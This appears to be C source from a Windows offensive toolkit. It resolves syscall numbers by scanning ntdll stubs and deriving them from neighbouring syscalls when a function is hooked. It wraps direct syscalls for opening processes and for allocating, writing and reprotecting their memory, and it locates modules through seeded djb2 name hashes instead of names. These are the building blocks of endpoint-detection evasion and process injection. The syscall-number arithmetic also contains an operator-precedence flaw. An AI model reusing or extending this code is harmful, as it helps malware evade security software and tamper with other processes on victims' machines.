static DWORD64 GetSSN(_In_ PVOID pAddress)
{
    BYTE low, high;

    /*
        Handle non-hooked functions

        mov r10, rcx
        mov rax, <ssn>
    */
    if (*((PBYTE)pAddress + 0) == 0x4c && *((PBYTE)pAddress + 1) == 0x8b && *((PBYTE)pAddress + 2) == 0xd1 &&
        *((PBYTE)pAddress + 3) == 0xb8 && *((PBYTE)pAddress + 6) == 0x00 && *((PBYTE)pAddress + 7) == 0x00) {

        high = *((PBYTE)pAddress + 5);
        low = *((PBYTE)pAddress + 4);

        return (high << 8) | low;
    }

    // Derive SSN from neighbour syscalls
    for (WORD idx = 1; idx <= MAX_NEIGHBOURS; idx++) {
        if (*((PBYTE)pAddress + 0 + idx * NEXT) == 0x4c && *((PBYTE)pAddress + 1 + idx * NEXT) == 0x8b &&
            *((PBYTE)pAddress + 2 + idx * NEXT) == 0xd1 && *((PBYTE)pAddress + 3 + idx * NEXT) == 0xb8 &&
            *((PBYTE)pAddress + 6 + idx * NEXT) == 0x00 && *((PBYTE)pAddress + 7 + idx * NEXT) == 0x00) {

            high = *((PBYTE)pAddress + 5 + idx * NEXT);
            low = *((PBYTE)pAddress + 4 + idx * NEXT);

            return (high << 8) | low - idx;
        }

        if (*((PBYTE)pAddress + 0 + idx * PREV) == 0x4c && *((PBYTE)pAddress + 1 + idx * PREV) == 0x8b &&
            *((PBYTE)pAddress + 2 + idx * PREV) == 0xd1 && *((PBYTE)pAddress + 3 + idx * PREV) == 0xb8 &&
            *((PBYTE)pAddress + 6 + idx * PREV) == 0x00 && *((PBYTE)pAddress + 7 + idx * PREV) == 0x00) {

            high = *((PBYTE)pAddress + 5 + idx * PREV);
            low = *((PBYTE)pAddress + 4 + idx * PREV);

            return (high << 8) | low + idx;

        }
    }

    return -1;
}

NTSTATUS NtAllocateVirtualMemory(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect)
{
    return NtAllocateVirtualMemoryStub(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS NtWriteVirtualMemory(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _In_ PVOID Buffer, _In_ ULONG NumberOfBytesToWrite, _Out_opt_ PULONG NumberOfBytesWritten)
{
    return NtWriteVirtualMemoryStub(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS NtOpenProcess(_Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK AccessMask, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ PCLIENT_ID ClientId)
{
    return NtOpenProcessStub(ProcessHandle, AccessMask, ObjectAttributes, ClientId);
}

NTSTATUS NtProtectVirtualMemory(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _Inout_ PULONG NumberOfBytesToProtect, _In_ ULONG NewAccessProtection, _Out_ PULONG OldAccessProtection)
{
    return NtProtectVirtualMemoryStub(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}

NTSTATUS NtReadVirtualMemory(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _Out_ PVOID Buffer, _In_ ULONG NumberOfBytesToRead, _Out_opt_ PULONG NumberOfBytesReaded)
{
    return NtReadVirtualMemoryStub(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded);
}

NTSTATUS NtQueryVirtualMemory(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _In_ MEMORY_INFORMATION_CLASS MemoryInformationClass, _Out_ PVOID Buffer, _In_ ULONG Length, _Out_opt_ PULONG ResultLength)
{
    return NtQueryVirtualMemoryStub(ProcessHandle, BaseAddress, MemoryInformationClass, Buffer, Length, ResultLength);
}

BOOL HReadProcessMemory(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _Out_ PVOID Buffer, _In_ ULONG NumberOfBytesToRead, _Out_opt_ PULONG NumberOfBytesReaded)
{
    return (NtReadVirtualMemoryStub(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded) == 0);
}

BOOL HVirtualProtect(_Inout_ PVOID* BaseAddress, _Inout_ PULONG NumberOfBytesToProtect, _In_ ULONG NewAccessProtection, _Out_ PULONG OldAccessProtection)
{
    return (NtProtectVirtualMemoryStub((HANDLE)-1, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection) == 0);
}

BOOL HVirtualProtectEx(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _Inout_ PULONG NumberOfBytesToProtect, _In_ ULONG NewAccessProtection, _Out_ PULONG OldAccessProtection)
{
    return (NtProtectVirtualMemoryStub(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection) == 0);
}

SIZE_T HVirtualQuery(_In_ PVOID* lpAddress, _Out_ PVOID lpBuffer, _In_ ULONG dwLength)
{
    return HVirtualQueryEx((HANDLE)-1, lpAddress, lpBuffer, dwLength);
}

SIZE_T HVirtualQueryEx(_In_ HANDLE hProcess, _In_ PVOID* lpAddress, _Out_ PVOID lpBuffer, _In_ ULONG dwLength)
{
    SIZE_T ResultLength = 0;
    NtQueryVirtualMemoryStub(hProcess, lpAddress, MemoryBasicInformation, lpBuffer, dwLength, &ResultLength);
    printf("VirtualQuery %d %d\n", dwLength, ResultLength);
    return ResultLength;
}

PVOID RtlAllocateHeapStub(_In_ PVOID  HeapHandle, _In_ ULONG  Flags, _In_ SIZE_T Size) {

    if (pRtlAllocateHeap == NULL) {
        PVOID addr = malloc(Size);
        if ((Flags & HEAP_ZERO_MEMORY) == HEAP_ZERO_MEMORY)
            memset(addr, 0x00, Size);
        return addr;
    }

    PVOID(*AH)(void) = pRtlAllocateHeap;
    return AH(HeapHandle, Flags, Size);
}

DWORD64 djb2(PBYTE str)
{
    DWORD64 dwHash = 0x7734773477347734;
    INT c;

    while (c = (INT)((char)*str++))
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

BOOL GetBaseAddresses(VOID)
{
    if (ntdllBase && kernel32Base && kernelbaseBase)
        return TRUE;

    // the kernels base address and later this images newly loaded base address
    ULONG_PTR uiBaseAddress;

    PPEB pCurrentPeb;
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry;

    PLIST_ENTRY pEntry = NULL;
    PLIST_ENTRY pHeadEntry = NULL;

    // get the Process Enviroment Block

    pCurrentPeb = NtCurrentPeb();

    if (!pCurrentPeb || pCurrentPeb->OSMajorVersion != 0x0a)
        return NULL;

    // get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
    uiBaseAddress = (ULONG_PTR)pCurrentPeb->LoaderData;

    DWORD64 idx = ModList.Count;
    if (idx == 0) {
        idx = 1;
        ModList.Count = 1;
    }

    pHeadEntry = &pCurrentPeb->LoaderData->InMemoryOrderModuleList;
    pEntry = pHeadEntry->Flink;
    while (pEntry != pHeadEntry)
    {

        pLdrDataEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        PWCHAR pcName = pLdrDataEntry->BaseDllName.Buffer;
        DWORD64 dwHash = djb2((PBYTE)pLdrDataEntry->BaseDllName.Buffer);
        
        // compare the hash with that of kernel32.dll -> 0x5DC35DC35DC35DFF
        if (dwHash == 0x5DC35DC35DC35DFF)
        {
            kernel32Base = (FARPROC)pLdrDataEntry->DllBase;
        }
        // compare the hash with that of ntdll.dll -> 0x5DC35DC35DC35E22
        else if (dwHash == 0x5DC35DC35DC35E22)
        {
            ntdllBase = (FARPROC)pLdrDataEntry->DllBase;

            //ntdll always should be the first
            ModList.Entries[0].pAddress = (PVOID)pLdrDataEntry->DllBase;
            ModList.Entries[0].dwHash = dwHash;
        }

        BOOL f = FALSE;
        for (DWORD i = 0; i < ModList.Count; i++)
        {
            if (((DWORD64)ModList.Entries[i].pAddress == (DWORD64)pLdrDataEntry->DllBase) || (dwHash == ModList.Entries[i].dwHash))
            {
                f = TRUE;
                break;
            }
        }

        if (!f) {
            ModList.Entries[ModList.Count].pAddress = (PVOID)pLdrDataEntry->DllBase;
            ModList.Entries[ModList.Count].dwHash = dwHash;
            ModList.Count++;
        }

        // we stop searching when we have found everything we need.
        if (ntdllBase && kernel32Base)
            break;

        // get the next entry
        pEntry = pEntry->Flink;

    }

    if (!ntdllBase) {
        ntdllBase = GetClearNtdll();
        ModList.Entries[0].pAddress = ntdllBase;
        ModList.Entries[0].dwHash = 0x5DC35DC35DC35E22;
    }

    if (!kernelbaseBase)
        kernelbaseBase = LoadLibraryA("kernelbase");

    if (ntdllBase && kernel32Base && kernelbaseBase)
        return TRUE;

    return FALSE;
}

//Look for a clear version of NTDLL
PVOID GetClearNtdll(VOID)
{

    // the kernels base address and later this images newly loaded base address
    ULONG_PTR uiBaseAddress;
    PPEB pCurrentPeb;
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
    PLIST_ENTRY pEntry = NULL;
    PLIST_ENTRY pHeadEntry = NULL;

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;
    PIMAGE_DOS_HEADER pImageDosHeader;
    PIMAGE_NT_HEADERS pImageNtHeaders;
    PVOID pBase;
    PDWORD pdwFunctions;
    PDWORD pdwNames;
    PWORD pwNameOrdinals;
    LPCSTR pcName = NULL;
    PVOID pAddress = NULL;

    // get the Process Enviroment Block

    pCurrentPeb = NtCurrentPeb();

    if (!pCurrentPeb || pCurrentPeb->OSMajorVersion != 0x0a)
        return NULL;

    // get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
    uiBaseAddress = (ULONG_PTR)pCurrentPeb->LoaderData;

    pHeadEntry = &pCurrentPeb->LoaderData->InMemoryOrderModuleList;
    pEntry = pHeadEntry->Flink;
    while (pEntry != pHeadEntry)
    {

        pLdrDataEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        PWCHAR pcName = pLdrDataEntry->BaseDllName.Buffer;
        //DWORD64 dwHash = djb2((PBYTE)pLdrDataEntry->BaseDllName.Buffer);

        pBase = pLdrDataEntry->DllBase;
        pImageDosHeader = (PIMAGE_DOS_HEADER)pBase;

        if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
            goto nextmod;

        pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pImageDosHeader->e_lfanew);

        if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
            goto nextmod;

        if (pImageNtHeaders->OptionalHeader.DataDirectory[0].Size == 0)
            goto nextmod;

        pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
        pdwFunctions = (PDWORD)((PBYTE)pBase + pImageExportDirectory->AddressOfFunctions);
        pdwNames = (PDWORD)((PBYTE)pBase + pImageExportDirectory->AddressOfNames);
        pwNameOrdinals = (PWORD)((PBYTE)pBase + pImageExportDirectory->AddressOfNameOrdinals);

        //LPCSTR
        int cnt = 0;

        for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
            pcName = (PCHAR)((PBYTE)pBase + pdwNames[i]);

            // Is this a system call?
            if ((*(USHORT*)pcName != 'tN'))
                continue;

            cnt++;
        }

        if (cnt > 200)
            return pBase;

    nextmod:
        // get the next entry
        pEntry = pEntry->Flink;
    }

    return NULL;
}
